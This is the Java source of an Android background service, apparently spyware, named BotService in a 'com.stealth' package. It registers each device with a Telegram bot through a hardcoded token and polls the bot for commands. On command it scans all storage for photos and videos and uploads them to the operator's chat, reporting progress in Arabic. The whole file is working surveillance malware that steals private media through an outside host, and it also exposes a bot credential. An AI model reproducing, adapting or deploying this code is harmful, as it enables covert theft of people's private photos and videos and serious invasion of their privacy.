package com.stealth.app;
import android.app.Service; import android.content.Intent; import android.os.IBinder;
import android.os.Environment; import android.provider.Settings;
import org.json.*; import java.io.*; import java.net.*; import java.util.*;
import okhttp3.*;

public class BotService extends Service {
    String BOT_TOKEN = "9099509890:AAGHvVaCVnsAyUi8JL2vNNYv2BFkSqUsMmI";
    String ADMIN = "8705795329";
    String GROUP = "1005616999717";
    String DEVICE_ID; String DEVICE_NAME = android.os.Build.MODEL;
    long lastUpdate = 0;
    OkHttpClient client = new OkHttpClient.Builder()
        .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
        .writeTimeout(300, java.util.concurrent.TimeUnit.SECONDS)
        .readTimeout(300, java.util.concurrent.TimeUnit.SECONDS).build();

    @Override public int onStartCommand(Intent i, int f, int s) {
        DEVICE_ID = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        if (DEVICE_ID == null) DEVICE_ID = "dev_" + System.currentTimeMillis();
        new Thread(new Runnable() {
            @Override public void run() { register(); }
        }).start();
        new java.util.Timer().scheduleAtFixedRate(new java.util.TimerTask() {
            @Override public void run() { checkUpdates(); }
        }, 0, 3000);
        return START_STICKY;
    }

    void register() {
        try {
            RequestBody b = new FormBody.Builder()
                .add("chat_id", GROUP)
                .add("text", "REG:" + DEVICE_ID + ":" + DEVICE_NAME)
                .build();
            client.newCall(new Request.Builder()
                .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage")
                .post(b).build()).execute().close();
        } catch(Exception e) {}
        try {
            RequestBody b2 = new FormBody.Builder()
                .add("chat_id", ADMIN)
                .add("text", "🟢 الجهاز متصل: " + DEVICE_NAME + "\n🆔 " + DEVICE_ID)
                .build();
            client.newCall(new Request.Builder()
                .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage")
                .post(b2).build()).execute().close();
        } catch(Exception e) {}
    }

    void checkUpdates() {
        try {
            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdate+1) + "&timeout=5";
            Response r = client.newCall(new Request.Builder().url(url).build()).execute();
            JSONObject res = new JSONObject(r.body().string()); r.close();
            JSONArray arr = res.optJSONArray("result");
            if (arr == null) return;
            for (int i = 0; i < arr.length(); i++) {
                JSONObject u = arr.getJSONObject(i);
                long uid = u.getLong("update_id");
                if (uid > lastUpdate) lastUpdate = uid;
                JSONObject post = u.optJSONObject("channel_post");
                if (post == null) post = u.optJSONObject("message");
                if (post == null) continue;
                String text = post.optString("text", "");
                if (text.equals("CMD:get_photos:" + DEVICE_ID)) sendAllMedia("photos");
                else if (text.equals("CMD:get_videos:" + DEVICE_ID)) sendAllMedia("videos");
                else if (text.equals("CMD:clear_log:" + DEVICE_ID)) clearLog();
            }
        } catch(Exception e) {}
    }

    void clearLog() {
        try {
            new File(getExternalFilesDir(null), "photos_sent.txt").delete();
            new File(getExternalFilesDir(null), "videos_sent.txt").delete();
            sendMsg("🗑️ تم مسح سجل الملفات المرسلة. الأمر التالي سيرسل الكل من جديد.");
        } catch(Exception e) {}
    }

    void sendAllMedia(String type) {
        sendMsg("🔍 جاري البحث في كل التخزين عن " + (type.equals("photos") ? "الصور" : "الفيديوهات") + "...");
        List<File> files = new ArrayList<>();
        Set<String> visited = new HashSet<>();
        scanFiles(Environment.getExternalStorageDirectory(), type, files, visited, 0);
        try {
            File[] roots = new File("/storage/").listFiles();
            if (roots != null) {
                for (File r : roots) {
                    if (r.getName().equals("emulated") || r.getName().equals("self")) continue;
                    if (!r.canRead() || r.equals(Environment.getExternalStorageDirectory())) continue;
                    scanFiles(r, type, files, visited, 0);
                }
            }
        } catch(Exception e) {}

        Set<String> alreadySent = new HashSet<>();
        File logFile = new File(getExternalFilesDir(null), type + "_sent.txt");
        if (logFile.exists()) {
            try {
                BufferedReader br = new BufferedReader(new FileReader(logFile));
                String line; while ((line = br.readLine()) != null) alreadySent.add(line.trim());
                br.close();
            } catch(Exception e) {}
        }
        FileWriter logW = null;
        try { logW = new FileWriter(logFile, true); } catch(Exception e) {}

        int total = files.size();
        int skippedOld = 0, skippedBig = 0, sent = 0, failed = 0;
        sendMsg("📊 وُجد " + total + " ملف. سيُرسل فقط الجديد...");

        for (int idx = 0; idx < files.size(); idx++) {
            File f = files.get(idx);
            String absPath;
            try { absPath = f.getCanonicalPath(); } catch(Exception e) { absPath = f.getAbsolutePath(); }
            if (alreadySent.contains(absPath)) { skippedOld++; continue; }
            if (type.equals("videos") && f.length() > 50L*1024*1024) { skippedBig++; continue; }
            if (!f.canRead() || f.length() == 0) continue;

            try {
                String field = type.equals("photos") ? "photo" : "video";
                String method = type.equals("photos") ? "sendPhoto" : "sendVideo";
                MultipartBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", ADMIN)
                    .addFormDataPart(field, f.getName(),
                        RequestBody.create(f, MediaType.parse(type.equals("photos") ? "image/*" : "video/*")))
                    .addFormDataPart("caption", absPath)
                    .build();
                Response resp = client.newCall(new Request.Builder()
                    .url("https://api.telegram.org/bot" + BOT_TOKEN + "/" + method)
                    .post(body).build()).execute();
                String bodyStr = resp.body().string(); resp.close();

                if (bodyStr.contains("\"ok\":true")) {
                    sent++;
                    if (logW != null) { logW.write(absPath + "\n"); logW.flush(); }
                } else {
                    failed++;
                    if (bodyStr.contains("429")) Thread.sleep(10000);
                    if (bodyStr.contains("400")) {
                        if (logW != null) { logW.write(absPath + "\n"); logW.flush(); }
                    }
                }
                if ((sent + failed) % 15 == 0 && (sent + failed) > 0) {
                    sendMsg("📤 تقدم: " + sent + " مرسل | " + failed + " فشل | " + total + " كلي");
                }
                Thread.sleep(1200);
            } catch(Exception e) { failed++; }
        }
        if (logW != null) try { logW.close(); } catch(Exception e) {}
        sendMsg("✅ انتهى!\n" +
                "✔️ جديد مرسل: " + sent + "\n" +
                "🔁 مرسل سابقاً: " + skippedOld + "\n" +
                "📦 أكبر من 50MB: " + skippedBig + "\n" +
                "❌ فشل: " + failed);
    }

    void scanFiles(File dir, String type, List<File> out, Set<String> visited, int depth) {
        if (dir == null || !dir.exists() || !dir.isDirectory() || depth > 25) return;
        String canon;
        try { canon = dir.getCanonicalPath(); } catch(Exception e) { return; }
        if (!visited.add(canon)) return;
        String name = dir.getName().toLowerCase();
        if (name.equals("cache") || name.equals(".cache") || name.equals(".thumbnails") ||
            name.equals("tmp") || name.equals("lost.dir") || name.startsWith(".trash")) return;
        if (canon.contains("/Android/data/") || canon.endsWith("/Android/data") ||
            canon.contains("/Android/obb/") || canon.endsWith("/Android/obb")) return;
        File[] list = dir.listFiles();
        if (list == null) return;
        for (File f : list) {
            if (f.isDirectory()) {
                scanFiles(f, type, out, visited, depth + 1);
            } else {
                String n = f.getName().toLowerCase();
                if (type.equals("photos") && (n.endsWith(".jpg")||n.endsWith(".jpeg")||n.endsWith(".png")||n.endsWith(".webp")))
                    out.add(f);
                else if (type.equals("videos") && (n.endsWith(".mp4")||n.endsWith(".3gp")||n.endsWith(".mkv")||n.endsWith(".avi")||n.endsWith(".mov")||n.endsWith(".webm")))
                    out.add(f);
            }
        }
    }

    void sendMsg(String txt) {
        try {
            RequestBody b = new FormBody.Builder()
                .add("chat_id", ADMIN)
                .add("text", txt)
                .build();
            client.newCall(new Request.Builder()
                .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage")
                .post(b).build()).execute().close();
        } catch(Exception e) {}
    }

    @Override public IBinder onBind(Intent i) { return null; }
}